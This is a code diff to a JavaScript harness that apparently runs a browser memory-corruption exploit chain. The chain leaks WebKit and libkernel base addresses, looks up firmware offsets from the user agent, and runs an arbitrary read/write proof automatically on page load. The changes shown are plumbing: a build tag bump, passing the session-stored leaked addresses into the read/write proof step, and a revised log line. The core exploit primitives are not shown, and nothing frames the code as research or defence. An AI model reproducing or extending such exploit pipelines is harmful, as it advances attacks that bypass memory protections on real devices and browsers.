@@ -9,7 +9,7 @@ import {
     persistSessionBases, saveLibkernelSession, saveLastFnPtr,
 } from "./libkernel_resolve.js";
 
-const BUILD = "arw-standalone-3";
+const BUILD = "arw-standalone-4";
 const LOG_MAX = 1200;
 
 const params = new URLSearchParams(location.search);
@@ -215,7 +215,9 @@ async function runPipeline() {
         if (!off) throw new Error("no firmware offsets for this UA");
 
         log("STEP", "═══ PHASE 3: 2e Leak+lk ═══");
-        await run2eLk(p, off, carrier);
+        const lk2eOk = await run2eLk(p, off, carrier);
+        const sessionWebkit = parseAddr(sessionStorage.getItem("wk-webkitBase"));
+        const sessionLk = parseAddr(sessionStorage.getItem("wk-libkernelBase"));
 
         log("STEP", "═══ PHASE 4: R/W proof ═══");
         const proof = runArwProofVerbose(p, off, carrier, {
@@ -224,6 +226,9 @@ async function runPipeline() {
             pairStatus,
             probeModules: PROBE_MODULES,
             verboseLeak: VERBOSE_PRIM,
+            lk2eOk,
+            sessionWebkit,
+            sessionLk,
         });
 
         flushLogSession();
@@ -253,7 +258,9 @@ async function runPipeline() {
 
 function init() {
     state("starting…", "warn");
-    log("AUTO", "primitive → 2e → R/W proof  (?noauto=1 to disable)");
+    log("AUTO", "primitive → 2e → R/W proof"
+        + "  modules=" + (PROBE_MODULES ? "1" : "0")
+        + "  (?noauto=1 to disable)");
     if (NO_AUTO) {
         state("noauto=1 — reload without it to run", "warn");
         return;
